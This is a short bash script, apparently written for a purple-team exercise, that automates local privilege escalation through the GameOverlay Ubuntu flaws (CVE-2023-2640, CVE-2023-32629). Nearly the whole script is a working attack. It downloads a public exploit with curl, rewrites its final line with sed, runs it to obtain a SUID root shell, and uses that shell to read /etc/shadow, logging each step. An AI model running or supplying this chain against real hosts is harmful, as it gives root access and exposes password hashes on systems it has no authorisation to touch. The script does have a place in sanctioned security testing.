#!/bin/bash
# Purple Team A1 - Stage 1: direct LPE, no external staging (T1068 only)
LOG=/tmp/purple_team_a1_runlog.txt
echo "[A1 S1] $(date -u +%Y-%m-%dT%H:%M:%SZ) uid_before=$(id)" >> $LOG

# Download the public GameOverlay PoC
curl -fsSL https://raw.githubusercontent.com/g1vi/CVE-2023-2640-CVE-2023-32629/main/exploit.sh \
  -o /tmp/.a1_s1_orig.sh 2>&1

# Patch the last line: replace interactive /var/tmp/bash -p with command execution
# Original ends with: u/bash -p -c "..."  (drops to interactive shell)
# We inject commands to run inside the root shell instead
sed 's|exec /var/tmp/bash -p|/var/tmp/bash -p -c "id \&\& echo PURPLE_TEAM_A1_S1_ROOT_CONFIRMED \&\& head -1 /etc/shadow" 2>\&1; rm -f /var/tmp/bash|g' \
  /tmp/.a1_s1_orig.sh > /tmp/.a1_s1.sh 2>/dev/null || cp /tmp/.a1_s1_orig.sh /tmp/.a1_s1.sh

chmod +x /tmp/.a1_s1.sh
echo "[A1 S1] $(date -u +%Y-%m-%dT%H:%M:%SZ) running exploit" >> $LOG
bash /tmp/.a1_s1.sh 2>&1 | tee -a $LOG

# If /var/tmp/bash was left (SUID set), run commands through it
if [ -f /var/tmp/bash ]; then
  /var/tmp/bash -p -c "id && echo PURPLE_TEAM_A1_S1_ROOT_CONFIRMED && head -1 /etc/shadow" 2>&1 | tee -a $LOG
  rm -f /var/tmp/bash
fi

echo "[A1 S1] $(date -u +%Y-%m-%dT%H:%M:%SZ) uid_after=$(id)" >> $LOG
